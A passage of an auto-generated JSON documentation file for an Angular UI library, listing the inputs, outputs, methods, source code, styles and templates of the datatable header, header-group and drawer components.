[rowClass]=\"rowClass\"\r\n                      [scrollLeft]=\"scrollbarH && footerRow ? scrollLeft : null\"\r\n                      [selectionMode]=\"selectionMode\"\r\n                      [scrollbarH]=\"footerRow ? false : scrollbarH\"\r\n                      [trackBy]=\"trackBy\"\r\n                      [virtualScroll]=\"virtualScroll\"\r\n                      [height]=\"bodyHeight\"\r\n                      [rowHeight]=\"rowHeight\"\r\n                      (rowContextMenu)=\"rowContextMenu.emit($event)\"\r\n                      (activate)=\"rowActivate.emit($event)\"\r\n                      (rowSelected)=\"select.emit($event)\"\r\n                      [columns]=\"columns\"\r\n                      (scrollHeader)=\"setHeaderScroll($event)\"\r\n                      [responsive]=\"responsive\"\r\n                      [responsiveView]=\"responsiveView\"\r\n                      [smallView]=\"smallScreen\"\r\n                      [hasFooter]=\"!!footerRow\"\r\n                      [selected]=\"selected\"></sto-datatable-body>\r\n  <div class=\"sto-mdl-table__footer\"\r\n       [style.overflowY]=\"'hidden'\"\r\n       [style.overflowX]=\"'auto'\"\r\n       (scroll)=\"scrollBodyAndHeader($event)\"\r\n       [style.width]=\"'calc(100% - ' + body.verticalScrollOffset + 'px)'\"\r\n       *ngIf=\"footerRow && (!responsive || (responsive && !smallScreen))\">\r\n    <div class=\"sto-mdl-table__footer__row\"\r\n         [class.sto-mdl-table__row--scroll-offset]=\"scrollbarH && !!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\"\r\n         *ngFor=\"let row of footerRow; let i = index\"\r\n         [style.min-width]=\"width\"\r\n         [style.overflowY]=\"'hidden'\"\r\n         [style.height]=\"rowHeight + 'px'\">\r\n      <div class=\"sto-mdl-table__footer__row__cell\"\r\n           [ngStyle]=\"column | columnStyle:columnMode\"\r\n           *ngFor=\"let column of columns; trackBy: trackColumnsFn\">\r\n        <span *ngIf=\"!column.footerTemplate\">\r\n          {{ row[column.prop] }}\r\n        </span>\r\n        <ng-template #footerTemplate\r\n                     *ngIf=\"column.footerTemplate\"\r\n                     [ngTemplateOutlet]=\"column.footerTemplate\"\r\n                     [ngTemplateOutletContext]=\"{column: column, value: row[column.prop], index: i}\">\r\n        </ng-template>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</div>\r\n<ng-content select=\"mat-paginator\"></ng-content>\r\n\r\n"
      },
      {
        "name": "StoDatatableHeaderComponent",
        "id": "component-StoDatatableHeaderComponent-35e7a1585fb73c50adc239bb6dcb71303a178f19c1984e9aaeb58aa843831c0f62ab70f00887a05b7fdbe5cd37c7f5f488c2ea1c7b936114fe72a598d9a52d60",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-header.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-header",
        "styleUrls": [
          "./sto-datatable-header.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-datatable-header.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "activeSortId",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 50,
            "type": "string | undefined",
            "decorators": []
          },
          {
            "name": "bodyHeight",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 40,
            "type": "number | null",
            "decorators": []
          },
          {
            "name": "columnMode",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 52,
            "type": "ColumnDisplay",
            "decorators": []
          },
          {
            "name": "columns",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 46,
            "type": "Column[]",
            "decorators": []
          },
          {
            "name": "headerHeight",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 30,
            "type": "number",
            "decorators": []
          },
          {
            "name": "offset",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 36,
            "type": "number",
            "decorators": []
          },
          {
            "name": "resizeable",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 32,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "responsive",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 26,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "rowHeight",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 44,
            "type": "number",
            "decorators": []
          },
          {
            "name": "rows",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 42,
            "type": "T[]",
            "decorators": []
          },
          {
            "name": "scrollLeft",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 38,
            "type": "string",
            "decorators": []
          },
          {
            "name": "smallScreen",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 28,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "sortable",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 48,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "width",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 34,
            "type": "string",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "headerContextMenu",
            "defaultValue": "new EventEmitter<HeaderContextMenu>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 65,
            "type": "EventEmitter"
          },
          {
            "name": "resized",
            "defaultValue": "new EventEmitter<{ columns: Column[], column: Column }>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 59,
            "type": "EventEmitter"
          },
          {
            "name": "sort",
            "defaultValue": "new EventEmitter<{ column: Column, sortDir: 'asc' | 'desc' | null }>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 67,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "ColumnDisplay",
                "defaultValue": "ColumnDisplay",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 53
              },
              {
                "name": "headerWidthMap",
                "defaultValue": "{}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Record<number | number>",
                "optional": false,
                "description": "",
                "line": 56,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "sortDirection",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "\"asc\" | \"desc\" | null",
                "optional": false,
                "description": "",
                "line": 61,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "tempWidth",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string | null",
                "optional": false,
                "description": "",
                "line": 54,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
                {
                    "name": "onResize",
                    "args": [
                      {
                        "name": "column",
                        "type": "Column",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "flexBasis",
                        "type": "number",
                        "deprecated": false,
                        "deprecationMessage": ""
                      }
                    ],
                  "optional": false,
                  "returnType": "void",
                  "typeParameters": [],
                  "line": 87,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "modifierKind": [
                    123
                  ],
                  "jsdoctags": [
                    {
                      "name": "column",
                      "type": "Column",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "flexBasis",
                      "type": "number",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                },
                {
                    "name": "onResizeEnd",
                    "args": [
                      {
                        "name": "col",
                        "type": "Column",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "flexBasis",
                        "type": "number",
                        "deprecated": false,
                        "deprecationMessage": ""
                      }
                    ],
                  "optional": false,
                  "returnType": "void",
                  "typeParameters": [],
                  "line": 103,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "jsdoctags": [
                    {
                      "name": "col",
                      "type": "Column",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "flexBasis",
                      "type": "number",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                },
              {
                "name": "sortByColumn",
                "args": [
                  {
                    "name": "column",
                    "type": "Column",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 73,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "column",
                    "type": "Column",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "trackColumnsFn",
                "args": [
                  {
                    "name": "index",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "item",
                    "type": "Column",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "any",
                "typeParameters": [],
                "line": 69,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "index",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "item",
                    "type": "Column",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output } from '@angular/core';\r\nimport { Column, ColumnDisplay } from '../columns';\r\nimport { HeaderContextMenu } from '../events';\r\nimport { animate, state, style, transition, trigger, } from '@angular/animations';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-header',\r\n  templateUrl: './sto-datatable-header.component.html',\r\n  styleUrls: ['./sto-datatable-header.component.scss'],\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  animations: [\r\n    trigger('sort', [\r\n      state('open', style({ width: '16px', opacity: 1 })),\r\n      transition('void => *', [\r\n        style({ width: 0, overflow: 'hidden', opacity: 0 }),\r\n        animate(150)\r\n      ]),\r\n      transition('* => void', [\r\n        animate(150, style({ width: 0, overflow: 'hidden', opacity: 0 }))\r\n      ])\r\n    ])\r\n  ]\r\n})\r\nexport class StoDatatableHeaderComponent<T = Record<string, unknown>> {\r\n  @Input()\r\n  responsive: boolean;\r\n  @Input()\r\n  smallScreen: boolean;\r\n  @Input()\r\n  headerHeight: number;\r\n  @Input()\r\n  resizeable: boolean;\r\n  @Input()\r\n  width: string;\r\n  @Input()\r\n  offset: number;\r\n  @Input()\r\n  scrollLeft: string;\r\n  @Input()\r\n  bodyHeight: number | null;\r\n  @Input()\r\n  rows: T[];\r\n  @Input()\r\n  rowHeight: number;\r\n  @Input()\r\n  columns: Column[];\r\n  @Input()\r\n  sortable: boolean;\r\n  @Input()\r\n  activeSortId: string | undefined;\r\n  @Input()\r\n  columnMode: ColumnDisplay;\r\n  ColumnDisplay = ColumnDisplay;\r\n  public tempWidth: string | null;\r\n\r\n  public headerWidthMap: Record<number, number> = {};\r\n\r\n  @Output()\r\n  resized = new EventEmitter<{ columns: Column[], column: Column }>();\r\n\r\n  public sortDirection: 'asc' | 'desc' | null;\r\n\r\n\r\n  @Output()\r\n  headerContextMenu = new EventEmitter<HeaderContextMenu>();\r\n  @Output()\r\n  sort = new EventEmitter<{ column: Column, sortDir: 'asc' | 'desc' | null }>();\r\n\r\n  public trackColumnsFn(index: number, item: Column) {\r\n    return item.$$id;\r\n  }\r\n\r\n  sortByColumn(column: Column) {\r\n    if ( !this.sortable || column.disableSort ) {\r\n      return;\r\n    }\r\n    if ( column.$$id === this.activeSortId && this.sortDirection === 'desc' ) {\r\n      this.sortDirection = null;\r\n    } else if ( column.$$id === this.activeSortId && this.sortDirection === 'asc' ) {\r\n      this.sortDirection = 'desc';\r\n    } else {\r\n      this.sortDirection = 'asc';\r\n    }\r\n    this.sort.emit({ column, sortDir: this.sortDirection });\r\n  }\r\n\r\n  public onResize(column: Column, flexBasis: number): void {\r\n    const width = 0;\r\n    const colIndex = this.columns.indexOf(column);\r\n    this.headerWidthMap[ colIndex ] = flexBasis;\r\n    /*    const cols = this.columns\r\n          .map(c => {\r\n            if ( c === column ) {\r\n              c.flexBasis = flexBasis;\r\n            }\r\n            width = width + c.flexBasis;\r\n            return c;\r\n          });*/\r\n    this.tempWidth = ( this.offset + width ) + 'px';\r\n    // this.columns = [...cols];\r\n  }\r\n\r\n  onResizeEnd(col: Column, flexBasis: number) {\r\n    // this.onResize(column, flexBasis);\r\n    const columns = this.columns\r\n      .map(c => {\r\n        if ( c === col ) {\r\n          return {\r\n            ...c,\r\n            flexBasis\r\n          };\r\n        }\r\n        return c;\r\n      });\r\n    this.tempWidth = null;\r\n    const column = { ...col, flexBasis };\r\n    this.resized.emit({ columns, column });\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-mdl-table__header__row__cell {\r\n  display: flex;\r\n  align-items: center;\r\n  font-weight: 700;\r\n\r\n  &--sortable {\r\n    cursor: pointer;\r\n  }\r\n\r\n  .mat-icon {\r\n    font-size: 16px;\r\n    line-height: 24px;\r\n    margin-right: 8px;\r\n  }\r\n\r\n  span {\r\n    min-width: 0;\r\n    overflow: hidden;\r\n    white-space: nowrap;\r\n    text-overflow: ellipsis;\r\n  }\r\n}\r\n\r\n@keyframes sort {\r\n\r\n}\r\n",
            "styleUrl": "./sto-datatable-header.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<div class=\"sto-mdl-table__header\"\r\n     [style.overflow-y]=\"'hidden'\"\r\n     [style.overflowX]=\"'hidden'\"\r\n     *ngIf=\"!responsive || (responsive && !smallScreen)\">\r\n  <div class=\"sto-mdl-table__header__row\"\r\n       (dragover)=\"$event.preventDefault()\"\r\n       [style.display]=\"columnMode === ColumnDisplay.Flex ? 'flex' : 'block'\"\r\n       [style.height]=\"headerHeight + 'px'\"\r\n       [style.min-width]=\"tempWidth || width\"\r\n       [style.transform]=\"scrollLeft\"\r\n       [style.overflow]=\"'hidden'\"\r\n       [class.sto-mdl-table__row--scroll-offset]=\"!!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\">\r\n    <div class=\"sto-mdl-table__header__row__cell\"\r\n         (click)=\"sortByColumn(column)\"\r\n         (contextmenu)=\"headerContextMenu.emit({event: $event, column: column})\"\r\n         [class.sto-mdl-table__header__row__cell--sortable]=\"sortable && !column.disableSort\"\r\n         [ngClass]=\"column.headerClass | exec:column\"\r\n         [ngStyle]=\"column | columnStyle:columnMode:(resize.width$ | async)\"\r\n         *ngFor=\"let column of columns; let i = index; trackBy: trackColumnsFn\">\r\n      <mat-icon [@sort]=\"activeSortId === column.$$id ? 'open' : 'close'\"\r\n                [title]=\"sortDirection === 'desc' ? 'DESC' : 'ASC'\"\r\n                *ngIf=\"activeSortId === column.$$id\">\r\n        {{ activeSortId === column.$$id && sortDirection === 'desc' ? 'arrow_downward' : 'arrow_upward' }}\r\n      </mat-icon>\r\n      <span *ngIf=\"!column.headerTemplate\"\r\n            class=\"sto-mdl-table__header__row__cell__content\"\r\n            [title]=\"column.name\">{{ column.name || '' }}</span>\r\n      <ng-template #headerTemplate\r\n                   *ngIf=\"column.headerTemplate\"\r\n                   [ngTemplateOutlet]=\"column.headerTemplate\"\r\n                   [ngTemplateOutletContext]=\"{column: column}\">\r\n      </ng-template>\r\n      <span [style.height.px]=\"headerHeight - 4\"\r\n            (click)=\"$event.stopPropagation();\"\r\n            stoDatatableResize\r\n            #resize=\"stoDatatableResize\"\r\n            [column]=\"column\"\r\n            [style.display]=\"resizeable && !column.disableResize ? 'inherit' : 'none'\"\r\n            (resizeEnd)=\"onResizeEnd(column, $event)\"\r\n            (resize)=\"onResize(column, $event)\">\r\n        <span style=\"width: 1px; height: 100%; margin: auto\"></span>\r\n      </span>\r\n    </div>\r\n  </div>\r\n</div>\r\n"
      },
      {
        "name": "StoDatatableHeaderGroupComponent",
        "id": "component-StoDatatableHeaderGroupComponent-72462d617015e93e816888110a0110c4c65e6fc25a70a2f35d02d4f98c9a7ff15e9995572093e5483167f62541636dbe7bb68f76467197684f4e6d99b80d2dea",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header-group/sto-datatable-header-group.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-header-group",
        "styleUrls": [
          "./sto-datatable-header-group.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-datatable-header-group.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "columns",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 20,
            "type": "Column[]",
            "decorators": []
          },
          {
            "name": "groups",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "ColumnGroup[]",
            "decorators": []
          },
          {
            "name": "height",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 14,
            "type": "number",
            "decorators": []
          },
          {
            "name": "transform",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 18,
            "type": "string",
            "decorators": []
          },
          {
            "name": "width",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 16,
            "type": "string",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [
          {
            "name": "ngOnChanges",
            "args": [
              {
                "name": "changes",
                "type": "SimpleChanges",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 33,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "changes",
                "type": "SimpleChanges",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "testOffset",
            "args": [
              {
                "name": "group",
                "type": "ColumnGroup",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "string",
            "typeParameters": [],
            "line": 22,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "group",
                "type": "ColumnGroup",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, Component, Input, OnChanges, SimpleChanges } from '@angular/core';\r\nimport { Column, ColumnGroup } from '../columns';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-header-group',\r\n  templateUrl: './sto-datatable-header-group.component.html',\r\n  styleUrls: [ './sto-datatable-header-group.component.scss' ],\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class StoDatatableHeaderGroupComponent implements OnChanges {\r\n  @Input()\r\n  groups: ColumnGroup[];\r\n  @Input()\r\n  height: number;\r\n  @Input()\r\n  width: string;\r\n  @Input()\r\n  transform: string;\r\n\r\n  @Input() columns: Column[];\r\n\r\n  testOffset(group: ColumnGroup) {\r\n    if ( !this.columns ) {\r\n      return '';\r\n    }\r\n    const { columnStart } = group;\r\n    const slice = this.columns.slice(0, columnStart);\r\n    let transform = 0;\r\n    slice.forEach(col => transform = transform + ( col.flexBasis || 80 ));\r\n    return `translateX(${transform + 8}px)`;\r\n  }\r\n\r\n  ngOnChanges(changes: SimpleChanges): void {\r\n    if ( changes.groups || changes.columns ) {\r\n      const groups: ColumnGroup[] = changes.groups ? changes.groups.currentValue : this.groups;\r\n      const columns = changes.columns ? changes.columns.currentValue : this.columns;\r\n      if ( groups && columns ) {\r\n        groups.forEach(group => {\r\n          group.transform = this.testOffset(group);\r\n        });\r\n      }\r\n    }\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ":host {\r\n  display: block;\r\n  overflow: hidden;\r\n}\r\n",
            "styleUrl": "./sto-datatable-header-group.component.scss"
          }
        ],
        "stylesData": "",
        "implements": [
          "OnChanges"
        ],
        "templateData": "<div [style.height.px]=\"height\"\r\n     [style.min-width]=\"width\"\r\n     [style.transform]=\"transform\"\r\n     class=\"sto-mdl-table__header-group\">\r\n  <div *ngFor=\"let group of groups\"\r\n       [style.transform]=\"group.transform\"\r\n       class=\"sto-mdl-table__header-group__cell\">\r\n    {{ group.name }}\r\n  </div>\r\n</div>\r\n"
      },
      {
        "name": "StoDrawerComponent",
        "id": "component-StoDrawerComponent-7129705bc57fa1d42684c4fff6e0d76af46dd29379554890e8297bdf0661175731ab48c31a9dd54b2bc892e1c683c2dcb38047d788f8179b78a5974ef937acc8",
        "file": "libs/drawer/src/lib/sto-drawer/sto-drawer.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-drawer",
        "styleUrls": [
          "./sto-drawer.component.scss",
          "../sto-navigation/_sto-navigation.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-drawer.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "animation",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 106,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "backdrop",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 108,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "closeOnClick",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf the drawer should close when clicked outside the drawer.\n",
            "description": "<p>If the drawer should close when clicked outside the drawer.</p>\n",
            "line": 84,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "cssClass",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nAdditional css class(es) as a string e.g 'sto-drawer--xmas'.\n",
            "description": "<p>Additional css class(es) as a string e.g &#39;sto-drawer--xmas&#39;.</p>\n",
            "line": 80,
            "type": "string",
            "decorators": []
          },
          {
            "name": "ignoreEscKey",
            "defaultValue": "false",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEsc key closed by default the drawer, this overrides that behaviour.\nDefault false.\n",
            "description": "<p>Esc key closed by default the drawer, this overrides that behaviour.\nDefault false.</p>\n",
            "line": 90,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "offset",
            "defaultValue": "'0'",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nOffset (space) between the viewPanel right and the drawer in pixels\nBinds to the right style property.\nUsed for multiple drawers where the offset would be the widht of the allready opened drawer.\nDefault 0.\n",
            "description": "<p>Offset (space) between the viewPanel right and the drawer in pixels\nBinds to the right style property.\nUsed for multiple drawers where the offset would be the widht of the allready opened drawer.\nDefault 0.</p>\n",
            "line": 65,
            "type": "string",
            "decorators": []
          },
          {
            "name": "open",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf the drawer is opened.\n",
            "description": "<p>If the drawer is opened.</p>\n",
            "line": 41,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "padding",
            "defaultValue": "'0px'",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nOffset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\nDefault 0.\n",
            "description": "<p>Offset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\nDefault 0.</p>\n",
            "line": 71,
            "type": "string",
            "decorators": []
          },
          {
            "name": "position",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nPosition of the drawer as a string\nLeft or right. Default right.\n",
            "description": "<p>Position of the drawer as a string\nLeft or right. Default right.</p>\n",
            "line": 76,
            "type": "\"left\" | \"right\"",
            "decorators": []
          },
          {
            "name": "width",
            "defaultValue": "'300px'",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nThe width of the drawer in as a string (pixels: '600px', presentage: '33%', or viewPort:'30vw')\nDefault '25vw'\n",
            "description": "<p>The width of the drawer in as a string (pixels: &#39;600px&#39;, presentage: &#39;33%&#39;, or viewPort:&#39;30vw&#39;)\nDefault &#39;25vw&#39;</p>\n",
            "line": 99,
            "type": "string",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "cancel",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits on cancel. When the cancel is called by pressing ESC key.\n {EventEmitter<any>}\n",
            "description": "<p>Emits on cancel. When the cancel is called by pressing ESC key.\n {EventEmitter<any>}</p>\n",
            "line": 128,
            "type": "EventEmitter"
          },
          {
            "name": "onClose",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits on close.\n",
            "description": "<p>Emits on close.</p>\n",
            "line": 118,
            "type": "EventEmitter"
          },
          {
            "name": "onOpen",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits on open.\n",
            "description": "<p>Emits on open.</p>\n",
            "line": 122,
            "type": "EventEmitter"
          },
          {
            "name": "onToggle",
            "defaultValue": "new EventEmitter<boolean>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits true if opened, false if closed.\n {EventEmitter<boolean>}\n",
            "description": "<p>Emits true if opened, false if closed.\n {EventEmitter<boolean>}</p>\n",
            "line": 114,
            "type": "EventEmitter"
          },
          {
            "name": "submit",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits on submit. When the submit is called from code like CTRL+S.\n {EventEmitter<any>}\n",
            "description": "<p>Emits on submit. When the submit is called from code like CTRL+S.\n {EventEmitter<any>}</p>\n",
            "line": 133,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "_open",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 92,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "footer",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLElement>",
                "optional": false,
                "description": "",
                "line": 139,
                "decorators": [
                  {
                    "name": "ContentChild",
                    "stringifiedArguments": "StoDrawerFooterComponent, {read: ElementRef}"
                  }
                ]
              },
              {
                "name": "h",
                "defaultValue": "100",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 103,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": "'style.height.vh'"
                  }
                ]
              },
              {
                "name": "headerRef",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef",
                "optional": false,
                "description": "",
                "line": 137,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'header'"
                  }
                ]
              },
              {
                "name": "height",
                "defaultValue": "'100%'",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 135,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "closeDrawer",
                "args": [
                  {
                    "name": "emit",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "true"
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 212,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "emit",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "true",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "handleKeyboardEvent",
                "args": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 146,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'document:keydown', ['$event']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "isAnActiveOverlayPresent",
                "args": [],
                "optional": false,
                "returnType": "boolean",
                "typeParameters": [],
                "line": 183,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nTest if an active overlay is active by checkout for cdk-overlay-containeres that are active.\nThis indicates a select-list, dialog or menu is opened.\ntrue if an active overlay is present in the DOM.\n",
                "description": "<p>Test if an active overlay is active by checkout for cdk-overlay-containeres that are active.\nThis indicates a select-list, dialog or menu is opened.\ntrue if an active overlay is present in the DOM.</p>\n",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 247,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 241,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onWindowResize",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 196,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'window:resize', ['$event']"
                  }
                ]
              },
              {
                "name": "openDrawer",
                "args": [
                  {
                    "name": "emit",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "true"
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 220,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "emit",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "true",
